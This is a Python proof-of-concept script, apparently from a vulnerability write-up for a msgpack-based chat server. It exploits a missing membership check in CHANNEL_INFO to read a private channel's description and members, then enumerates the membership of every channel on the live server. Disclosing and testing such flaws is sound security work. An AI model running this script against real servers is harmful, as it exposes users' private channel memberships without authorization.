"""
VULN-01: CHANNEL_INFO exposes member lists to non-members
=========================================================
Any authenticated user can call CHANNEL_INFO on any channel without
being a member and receive the full member list and description.

Impact: enumerate every channel's membership across the server.

Run: uv run python vulnerabilities/poc_01_channel_info_disclosure.py
"""
import socket, msgpack, random, time

HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    h = random.randrange(1, 2**32)
    s.send(msgpack.packb({'request_type': 1, 'request_handle': h}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session'], r.get(b'username', b'').decode()

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)


def main():
    # --- Setup: User A creates a private channel ---
    sock_a, sess_a, user_a = connect()
    channel = f'private-{random.randint(10000, 99999)}'
    req(sock_a, {
        'request_type': 4, 'session': sess_a, 'request_handle': h(),
        'channel': channel, 'description': 'confidential — members only'
    })
    print(f'[A] {user_a} created private channel: {channel}')

    # --- Exploit: User B reads it without joining ---
    time.sleep(0.3)
    sock_b, sess_b, user_b = connect()
    print(f'[B] {user_b} has NOT joined {channel}')

    info = req(sock_b, {
        'request_type': 6, 'session': sess_b,
        'request_handle': h(), 'channel': channel
    })

    print(f'\n[B] CHANNEL_INFO response (without joining):')
    print(f'    channel     : {info.get(b"channel", b"").decode()}')
    print(f'    description : {info.get(b"description", b"").decode()}')
    print(f'    members     : {[m.decode() for m in info.get(b"members", [])]}')

    assert info.get(b'response_type') == 27, 'Expected success response'
    print(f'\n[!] CONFIRMED: non-member received full channel info')

    # --- Full server enumeration demo ---
    print(f'\n[B] Enumerating ALL channels and their members...')
    channel_list = req(sock_b, {
        'request_type': 5, 'session': sess_b, 'request_handle': h(), 'offset': 0
    })
    channels = channel_list.get(b'channels', []) if channel_list else []
    for ch in channels:
        info = req(sock_b, {
            'request_type': 6, 'session': sess_b,
            'request_handle': h(), 'channel': ch.decode()
        })
        members = [m.decode() for m in info.get(b'members', [])] if info else []
        print(f'    {ch.decode()}: {members}')
        time.sleep(0.1)

    # --- Cleanup ---
    req(sock_a, {'request_type': 8, 'session': sess_a, 'request_handle': h(), 'channel': channel})
    sock_a.close()
    sock_b.close()


if __name__ == '__main__':
    main()
